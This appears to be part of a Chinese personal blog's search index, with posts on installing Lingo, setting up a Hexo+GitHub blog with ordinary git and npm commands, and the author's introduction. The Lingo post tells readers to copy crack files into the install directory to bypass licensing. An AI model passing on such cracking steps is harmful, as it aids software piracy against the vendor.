Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。 待更新","path":"2018/09/14/Lingo基本操作/"},{"title":"Lingo安装","text":"Lingo简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LINGO是Linear Interactive and General Optimizer的缩写，即“交互式的线性和通用优化求解器”，由美国LINDO系统公司（Lindo System Inc.）推出的，可以用于求解非线性规划，也可以用于一些线性和非线性方程组的求解等，功能十分强大，是求解优化模型的最佳选择。其特色在于内置建模语言，提供十几个内部函数，可以允许决策变量是整数（即整数规划，包括 0-1 整数规划），方便灵活，而且执行速度非常快。能方便与EXCEL，数据库等其他软件交换数据。 Lingo安装 Lingo下载地址：点击我&nbsp;&nbsp;&nbsp;&nbsp;密码：r6cy 下载到本地并解压后可见以下文件 双击运行LINGO-WINDOWS-IA32-12.0.exe可执行文件 单击Next 单击I accept 并Next 更改安装目录，Next 点击Only For Me，出现后续窗口点击OK 取消Launch，并Finish 打开“lingo12破解文件”并复制所有文件粘贴至Lingo所在目录 安装完成 安装声明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的安装文件皆来自网络共享资源，若想更好的体验请支持正版,Lingo官网下载地址:点击我。如内容有侵犯您的版权或利益的请联系QQ：26647879,WX：LT510087153，鄙人见后会在第一时间进行处理。","path":"2018/09/13/Lingo安装/"},{"title":"Hexo+Github建站","text":"前言gitHub是一个面向开源及私有软件项目的托管平台，也是版本控制库因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。此后，2018年6月4日，微软宣布，通过75亿美元的股票交易收购代码托管平台GitHub。Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 官网：Github：https://github.com/Hexo：https://hexo.io/zh-cn/docs/ 以上摘自官方解释 作为一位Coder，一直想找个安静的地方沉淀一下自己，记录自己学习的过程并分享所走过的坑。网上也有各种各样的建站方法，例如WordPress、emlog、Typecho等等平台。但是绝大多数的平台的使用都避免不了备案等一系列的困扰，对于懒癌患者来说无疑是一大痛病，通过海量信息的层层筛选，鄙人最终发现Hexo+Github能够很好的满足大多数人的要求，既简单又美观，使用它来搭建属于自己的个人博客再好不过了。如果你有也有建站的想法的话，那么以下内容将记录了我搭建过程所走的坑，或许能够帮助到你，久而久之，你还会发现其中还有很多有意思的美化操作。 以下的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。 一、搭建环境环境介绍： windows系统。系统根据自己的需要准备即可，mac、linux皆可，本文以windows系统环境下搭建为例。 git。安装之后方便使用各种命令，还能够更好的clone github仓库。 node.js。一个Javascript运行环境，网站的搭建必须建立在这个框架之上。 Hexo。使用命令可以直接将Hexo生成的静态资源存储到Github上，然后使用自己的github账户即可访问。 安装：Git的安装：你可在git官网中根据自己的需要进行下载：https://git-scm.com/。打开之后你将看到如下内容： 将其下载到指定的磁盘，然后傻瓜式安装即可。安装好后打开cmd终端，执行git --version，若出现git version 2.19.2.windows.1之类的输出则说明已经成功安装。 node.js的安装：node.js的安装和Git的安装如出一辙，同样的操作下载node.js并安装即可，安装好后我们在cmd终端使用node -v命令，如出现v10.13.0类似输出，则说明已经成功安装。node.js下载：https://nodejs.org/en/ github注册进入github的注册页面：https://github.com/ 然后根据流程填写相应的信息即可。 二、博客搭建创建仓库并部署注册了github之后，我们需要创建一个仓库来存储我们的网站源码，创建的仓库名也就是我们博客访问的url地址，该url是采用子域名的方式，其一般形式为：1XXX.github.io 上面的XXX一般代表着你注册时的github用户名，所以在你注册之后该仓库名一般是固定的，仓库的创建及部署流程如下： 进入个人github主页之后点击New repository来创建仓库，如下： 之后按照如下内容进行创建 完成以上操作之后，你就已经成功创建好了自己的仓库。这时我们需要利用git命令来生成秘钥。鼠标右键桌面选择git bash here，然后在git终端执行以下命令：1ssh-keygen -t rsa -C XXX@XXX.com 其中XXX@XXX.com指的是你注册github时候使用的邮箱，在命令执行的时候回有一些yes、no的选择，直接默认回车即可，最终你将会看到类似如下内容：1234Your identification has been saved in /c/Users/you/.ssh/id_rsa.Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.The key fingerprint is:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx your_email@example.com 之后你将在c/Users/you/.ssh/id_rsa.pub路径文件看到生成的秘钥对，这个文件我们暂且打开，之后复制粘贴会用到。 补充：打开git bash here之后我们首先需要配置一下个人信息，在git终端分别配置自己的用户名和邮箱。命令如下：12git config --global user.name XXX # XXX表示你github注册时的用户名git config --global user.email XXX # XXX表示你github注册时的邮箱 之后我们需要将ssh key添加到我们的github账户。在个人github主页找到settings，然后点击SSH and GPG keys，之后再出现的页面的中点击New SSH key，随后根据如下图操作进行添加ssh key： 打开git bash here，执行ssh -T git@github.com，之后会出现一系列的问题，我们只需要回答yes即可，最终会输出如下类似内容： 1Hi username! You've successfully authenticated OK，完成以上流程后，你的本机就可以连接github了。 Hexo博客框架的搭建在完成以上操作后，我们就可以来使用Hexo了，你可通过如下操作来进行。 在以上操作的基础上，我们首先安装一下hexo。根据自己的需要在磁盘中创建一个名为Hexo文件夹，为了更好的管理文件，鄙人是在E盘的根目录中创建改文件夹的。之后进入该文件并在当前路径下打开git bash here，依次运行如下命令来进行创建：12npm install hexo-cli -gnpm install hexo --save 执行完成之后，你会发现在该目录之下会有个node_modules文件夹生成，如此一来，你就已经安装好了Hexo，离终点又近了一点 (*￣rǒ￣) 以上的node_modules文件生成之后，我们需要配置一下Hexo的环境变量，以便在cmd中可以直接执行后续博客操作的命令。进入到node_module文件夹下的bin目录，然后复制该bin目录的路径，如下： 后面的添加环境变量的操作比较简单，所以就描述一些流程，就不贴图了。如果有遇到问题的可联系鄙人。后续操作描述如下：1. ctrl+D切换到桌面。2. 右键此电脑，打开属性。3. 点击左侧的高级系统设置。 4. 点击环境变量。5. 在用户变量或者系统变量中找到Path并双击它（推荐更改用户变量）6. 双击之后点击新建，然后将以上的复制的bin目录粘贴至此。6. 然后一步一步的确定、确定、确定。OK，完成了，是不是很简单 (*￣rǒ￣)。 在以上操作完成之后，win+r，打开cmd终端，然后执行Hexo -v，若出现如下类似信息，则说明你的Hexo已经成功配置环境变量。 随后，我们需要创建我们的博客站点的主目录，你可使用我推荐的方式进行创建，当然你也可以根据自己的喜好方式进行创建。首先在E盘的根目录下创建ZerosBlog文件夹（自定义），然后进入该文件夹并创建XXX.github.io文件夹（该文件夹名必须与你之前创建的github仓库名一致，固定），进入到该目录右键点击git bash here来打开git终端，之后在该终端下根据如下命令一步步进行操作： 初始化hexo：1hexo init 自动安装网站所需组件：1npm install OK，至此，你已经基本完成了网站的建设，可以说是万事具备，只欠东风了。一个基本的Hexo博客框架已经完成了，我们需要导入自己的喜欢的主题即可正常使用了，主题的引入操作如下。 三、主题引入Hexo中有很多很多很多的主题（一个、两个、三个。。。 Σ( ° △ °|||)︴ 好吧，我不知道有多少个，因为他会被许多的大神更新着，如果好奇的话自行了解即可），其主题官网为：https://hexo.io/themes/，你可以在此观摩并使用任意一个来作为你博客的主题，但据统计，绝大多数使用hexo+github来搭建博客的都是使用NexT，它的“精于心，简于形”的简单美受到了许多人的青睐，所以以下将以NexT为例来作为我们主题的引入，当然，你也可以去阅读NexT的主题文档。 在Hexo主题页面ctrl+F并输入next查找到NexT主题，然后点击进入到NexT主题的github页面，该页面存储了NexT主题的源码，我们需要将其下载下来为己所用。在前面我们已经提到了git的最为方便之处就是可以随意clone github的资源，在这个操作就可以显露出来了 ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~。 根据如下图所示复制出该主题的仓库链接： 复制好该链接后我们进入E:\\ZerosBlog\\XXX.github.io\\themes文件夹下，右键点击git bash here进入git终端，并执行如下命令，其中链接为你上一步所复制的内容1git clone https://github.com/theme-next/hexo-theme-next.git 如果你累了的话可以喝口茶，稍等片刻之后就会在该目录之下成功下载NexT主题了。 下载NexT主题后，我们需要配置来达到使用该主题的目的，该配置文件是属于站点的，其路径为E:\\ZerosBlog\\XXX.github.io\\_config.yml，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+f输入theme查找到theme属性，然后将值改为next，如下所示： 在NexT中已经为我们准备了四种博客样式，其配置文件在主题的配置文件中，即E\\ZerosBlog\\XXX.github.io\\themes\\next\\_config.yml文件，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+F输入scheme查找到如下内容：可以看见总共有四种主题Muse、Mist、Pisces、Gemini，你可以根据自己的喜好选择其中一种，然后将其他三种注释即可，ctrl+s保存然后退出 随后我们来到站点的根目录下，即E:\\ZerosBlog\\XXX.github.io，打开git终端，完成如下三步走命令 123hexo clean # 清除缓存heo g # 生成静态资源hexo d # 部署至github 在以上命令执行过程中，可能会遇到一个登陆表单的突然出现，我们只需要根据自己github注册时所填的信息进行登陆即可，命令执行完成之后我们的站点已经完成了部署并请求https://XXX.github.io/即可访问到自己的网站了，如下图所示： 四、总结以上的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。 至此，已经完成了博客的搭建，但是我们左看看、右看看，不管怎么看都似乎显得有点单调，在之后将会介绍Hexo的基本命令和博客的美化，可以引入一些插件，比如像Gitalk在线聊天、APlayer、字数统计等一些插件。 OK，结束了。 2018-09-10,By Zero","path":"2018/09/10/Hexo-Github建站/"},{"title":"Begin","text":"欲何求生于千禧一代间，年少轻狂不知高。 寒窗苦读十多载，无奈吾未有所为。 而今已过弱冠时，此时立沪两茫茫。 问己能有几多愁，木子不知欲何求。 关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。 基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 2018-12-10 为了进一步美化以及提高阅读体验，在本站添加了random动漫背景。 2019-03-01 换上了自己独立的域名https://muzimz.cn，欢迎每一位到来的朋友QAQ 关于我木子是江西上饶的一位小伙子，现于上海就读，现实生活中比较内向、形单影只，但热衷于各种技术，学的东西也比较杂，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。个人爱好： 动漫、code、音乐、乒乓球、棋牌本站会尽量维护并且不定期的更新一些自己在学习过程中所积累的知识，欢迎每一位志同道合朋友的到来，同时也希望有问题及时联系博主。 本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的安装与卸载，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等单词拼 写，熟悉Windows、Linux、Mac、 Android、IOS、WP8等系统的开关机……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的安装与卸载的工作 Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153 右方的DaoVoice在线联系 文末的Gitalk留言 友链添加最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下： 事项： 贵站需要保持一定的活跃度 贵站必须有10篇以上原创文章 贵站不在更新请及时联系本站 方式： 贵站将本站添加至友链后，可在下方Gitalk留言，附上贵站的链接及贵站主要分享类别即可。 本站须知 本站所有内容建议务必在PC端进行阅读，手机端的阅读效果可能不佳，也许会影响到您的阅读体验，给您带来不便敬请谅解。 本站部分所总结的内容涉及到Kali渗透，具有一定的攻击行为，所以仅供博主记录之用，切勿用于非法操作，一切后果由使用者本人自负。 本站所记录的内容没有特别标注的皆为博主日常学习所总结，欢迎各位的转载，转载时注明链接与作者即可。 本站转载文章会在醒目处留有说明，如有侵权还请联系。 如果本站内容能给你带来帮助那最好不过了，如果不喜欢的话也不要扔鸡蛋QAQ，谢谢。","path":"2018/09/08/Begin/"}]}